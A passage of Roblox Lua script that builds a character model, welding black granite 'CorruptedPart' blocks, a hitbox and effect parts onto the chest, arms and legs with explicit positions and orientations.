CorruptedPart = New("Part",Chest,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.400000006, 0.800000072, 1),CFrame = CFrame.new(2.28977966, 7.11656427, 1.34486222, -0.00110228383, -0.00980954897, -0.9999578, -1.00000536, 0.000536905834, 0.00109708123, 0.000526248943, 0.99994868, -0.00981033035),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.0011022957, -0.999999225, 0.000526249292, -0.00980958622, 0.000536918582, 0.99995172, -0.999951243, 0.0010970803, -0.00981026702),C1 = CFrame.new(-0.598430753, 0.800122261, 0.00106739998, 0.00980956666, -0.000537143264, -0.99995023, 0.00110225484, 1.00000238, -0.000526361808, 0.999954581, -0.00109704456, 0.00981020182),})
CorruptedPart = New("Part",Chest,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.400000006, 0.400000066, 1),CFrame = CFrame.new(2.29174757, 6.71645212, 1.54485857, -0.00110228383, -0.00980954897, -0.9999578, -1.00000536, 0.000536905834, 0.00109708123, 0.000526248943, 0.99994868, -0.00981033035),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.0011022957, -0.999999225, 0.000526249292, -0.00980958622, 0.000536918582, 0.99995172, -0.999951243, 0.0010970803, -0.00981026702),C1 = CFrame.new(-0.798183441, 0.399908543, 0.00543618202, 0.00980956666, -0.000537143264, -0.99995023, 0.00110225484, 1.00000238, -0.000526361808, 0.999954581, -0.00109704456, 0.00981020182),})
LeftArm = New("Model",chara,"LeftArm",{})
MainPart = New("Part",LeftArm,"MainPart",{Transparency = 1,Transparency = 1,FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(1, 2, 1),CFrame = CFrame.new(1.90889204, 6.31596565, 3.24640989, -0.0484240092, -0.0324009918, 0.998301268, -0.00117100019, 0.999474883, 0.0323822871, -0.998826265, 0.000399069104, -0.0484365262),CanCollide = false,})
Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara["Left Arm"],C0 = CFrame.new(0, 0, 0, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),C1 = CFrame.new(0, -8.10623169e-006, -2.38418579e-007, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
CorruptedPart = New("Part",LeftArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000006, 0.200000003),CFrame = CFrame.new(1.48370504, 6.50245714, 2.8663168, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(0.400017738, 0.200018406, -0.400015235, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
CorruptedPart = New("Part",LeftArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.600000024, 0.200000003),CFrame = CFrame.new(1.51924801, 6.60332775, 3.66543078, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(-0.399997473, 0.300003052, -0.399972558, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
EffCorruptedPart = New("Part",LeftArm,"EffCorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 1, 1),CFrame = CFrame.new(1.92512023, 5.81624889, 3.24619365, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",EffCorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",EffCorruptedPart,"Weld",{Part0 = EffCorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(1.52587891e-005, -0.49998045, 2.90870667e-005, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
CorruptedPart = New("Part",LeftArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.800000072, 0.200000003),CFrame = CFrame.new(2.31463432, 6.72918367, 3.62673688, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(-0.400012016, 0.400006294, 0.400012136, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
CorruptedPart = New("Part",LeftArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.200000003, 0.200000003),CFrame = CFrame.new(1.50631011, 6.40297413, 3.26581192, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(1.3589859e-005, 0.100014687, -0.400020242, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
CorruptedPart = New("Part",LeftArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000036, 0.200000003),CFrame = CFrame.new(1.92179501, 6.51633835, 3.64602208, -0.048417028, -0.0324150361, 0.998301387, -0.00116700074, 0.999474525, 0.03239654, -0.998826742, 0.000403525919, -0.0484294258),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.048417028, -0.00116700074, -0.998826623, -0.0324150361, 0.999474466, 0.000403525832, 0.998301208, 0.0323965363, -0.0484294109),C1 = CFrame.new(-0.40000248, 0.200008869, 1.37090683e-005, -0.0484240092, -0.00117100019, -0.998826265, -0.0324009918, 0.999474883, 0.000399069104, 0.998301268, 0.0323822871, -0.0484365262),})
BurningEff(EffCorruptedPart)
LeftLeg = New("Model",chara,"LeftLeg",{})
MainPart = New("Part",LeftLeg,"MainPart",{Transparency = 1,Transparency = 1,FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(1, 2, 1),CFrame = CFrame.new(2.2865479, 1.31659603, 1.24781799, 0.00980953407, 0.00110225566, 0.999961138, -0.000537137908, 1.00000858, -0.00109705783, -0.99994719, -0.000526368851, 0.00981026888),CanCollide = false,BottomSurface = Enum.SurfaceType.Smooth,})
Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara["Left Leg"],C0 = CFrame.new(0, 0, 0, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),C1 = CFrame.new(0, -8.58306885e-006, -2.38418579e-007, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
EffCorruptedPart = New("Part",LeftLeg,"EffCorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 0.200000048, 1),CFrame = CFrame.new(2.28007793, 0.400032878, 1.25993299, 1.00001979, -3.03611159e-007, -5.47617674e-007, 5.67175448e-007, 1.00001717, -5.60779881e-007, -1.86450779e-006, 9.50574758e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",EffCorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",EffCorruptedPart,"Weld",{Part0 = EffCorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 5.86369708e-007, -2.15602267e-006, -2.8440752e-007, 0.999998569, 9.76819592e-007, -8.39119252e-007, -5.34477465e-007, 0.999998569),C1 = CFrame.new(-0.0116856098, -0.916567385, -0.00534534454, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.600000024, 0.200000003),CFrame = CFrame.new(1.88013697, 0.800038397, 0.859943509, 1.00001979, -3.03611159e-007, -5.47617674e-007, 5.67175448e-007, 1.00001717, -5.60779881e-007, -1.86450779e-006, 9.50574758e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 5.86369708e-007, -2.15602267e-006, -2.8440752e-007, 0.999998569, 9.76819592e-007, -8.39119252e-007, -5.34477465e-007, 0.999998569),C1 = CFrame.new(0.3841483, -0.516796231, -0.40962553, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.800000012, 0.200000003),CFrame = CFrame.new(2.69002914, 0.915953577, 0.851962805, 0.999971032, 0.0011022269, -0.00980960391, -0.00109704852, 1.00001776, 0.000537177373, 0.00981036108, -0.000526409131, 0.999942601),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999951303, -0.0010970087, 0.00981015898, 0.00110222446, 0.999999166, -0.000526388001, -0.00980970077, 0.00053719338, 0.99995172),C1 = CFrame.new(0.400011122, -0.399985313, 0.400013685, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.800000012, 0.200000003),CFrame = CFrame.new(1.88013721, 0.900040269, 1.65993917, 1.00001979, -3.03611159e-007, -5.47617674e-007, 5.67175448e-007, 1.00001717, -5.60779881e-007, -1.86450779e-006, 9.50574758e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 5.86369708e-007, -2.15602267e-006, -2.8440752e-007, 0.999998569, 9.76819592e-007, -8.39119252e-007, -5.34477465e-007, 0.999998569),C1 = CFrame.new(-0.415866137, -0.41721642, -0.40188694, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.200000003, 0.200000003),CFrame = CFrame.new(1.88013721, 0.600035727, 1.25993288, 1.00001979, -3.03611159e-007, -5.47617674e-007, 5.67175448e-007, 1.00001717, -5.60779881e-007, -1.86450779e-006, 9.50574758e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 5.86369708e-007, -2.15602267e-006, -2.8440752e-007, 0.999998569, 9.76819592e-007, -8.39119252e-007, -5.34477465e-007, 0.999998569),C1 = CFrame.new(-0.0157161951, -0.717007458, -0.405481935, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000006, 0.200000003),CFrame = CFrame.new(2.28007793, 0.700037479, 1.65993929, 1.00001967, -3.84054147e-007, 3.90969217e-006, 6.35045581e-007, 1.00001717, -5.60838998e-007, -6.19795173e-006, 9.32147486e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 6.5424797e-007, -6.48946025e-006, -3.64865258e-007, 0.999998629, 9.58411874e-007, 3.61912225e-006, -5.34497644e-007, 0.999998629),C1 = CFrame.new(-0.411835551, -0.616776347, -0.00175023079, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 1.20000005, 0.200000003),CFrame = CFrame.new(2.68018699, 1.10004401, 1.65993941, 1.00001967, -3.84054147e-007, 3.90969217e-006, 6.35045581e-007, 1.00001717, -5.60838998e-007, -6.19795173e-006, 9.32147486e-007, 0.99998951),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 1, 6.5424797e-007, -6.48946025e-006, -3.64865258e-007, 0.999998629, 9.58411874e-007, 3.61912225e-006, -5.34497644e-007, 0.999998629),C1 = CFrame.new(-0.408125639, -0.216332912, 0.397896528, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
CorruptedPart = New("Part",LeftLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.600000024, 0.200000003),CFrame = CFrame.new(2.68596959, 0.816166699, 1.25195313, 0.999971032, 0.0011022269, -0.00980960391, -0.00109704852, 1.00001776, 0.000537177373, 0.00981036108, -0.000526409131, 0.999942601),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999951303, -0.0010970087, 0.00981015898, 0.00110222446, 0.999999166, -0.000526388001, -0.00980970077, 0.00053719338, 0.99995172),C1 = CFrame.new(5.20944595e-005, -0.499986172, 0.399987936, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
ScatterEff(EffCorruptedPart)
RightArm = New("Model",chara,"RightArm",{})
MainPart = New("Part",RightArm,"MainPart",{Transparency = 1,Transparency = 1,FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(1, 2, 1),CFrame = CFrame.new(2.011096, 6.31690788, -3.92582893, 0.00918400101, -0.262283146, 0.964947343, 0.259330034, 0.932596445, 0.251021653, -0.965745091, 0.247934431, 0.0765828639),CanCollide = false,})
Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara["Right Arm"],C0 = CFrame.new(0, 0, 0, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),C1 = CFrame.new(-2.86102295e-006, -9.05990601e-006, -2.38418579e-006, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
Hitbox = New("Part",RightArm,"Hitbox",{BrickColor = BrickColor.new("Really black"),Transparency = 1,Transparency = 1,Size = Vector3.new(1, 4, 1),CFrame = CFrame.new(22.2733669, 5.0842762, -22.1737366, -0.964945257, -0.262290984, 0.00919180829, -0.251027077, 0.93259424, 0.259333313, -0.0765930116, 0.247935042, -0.965744138),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Weld = New("ManualWeld",Hitbox,"Weld",{Part0 = Hitbox,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964945257, -0.251027077, -0.0765930116, -0.262290984, 0.93259424, 0.247935042, 0.00919180829, 0.259333313, -0.965744138),C1 = CFrame.new(-1.52587891e-005, -1.00003147, -1.71661377e-005, 0.0091838371, 0.259330064, -0.965745151, -0.262283117, 0.932596445, 0.247934505, 0.964947283, 0.251021653, 0.0765827149),})
CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 2, 1),CFrame = CFrame.new(2.011096, 6.3169179, -3.92581391, -0.964945257, -0.262290984, 0.00919180829, -0.251027077, 0.93259424, 0.259333313, -0.0765930116, 0.247935042, -0.965744138),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964945138, -0.251027018, -0.0765930042, -0.262290984, 0.932594121, 0.247935027, 0.00919180084, 0.259333313, -0.965744197),C1 = CFrame.new(-1.1920929e-005, 1.28746033e-005, 3.57627869e-006, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 0.600000024, 0.400000036),CFrame = CFrame.new(2.14866924, 6.03215551, -4.72580194, -0.964945078, 0.262291819, -0.00918725226, -0.251029015, -0.932593465, -0.259333432, -0.0765890032, -0.247936144, 0.965744317),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
Mesh = New("SpecialMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),MeshType = Enum.MeshType.Wedge,})
Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964944899, -0.251028955, -0.0765889958, 0.262291819, -0.932593465, -0.247936144, -0.00918724574, -0.259333432, 0.965744257),C1 = CFrame.new(0.699988842, -0.499982834, 7.62939453e-006, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
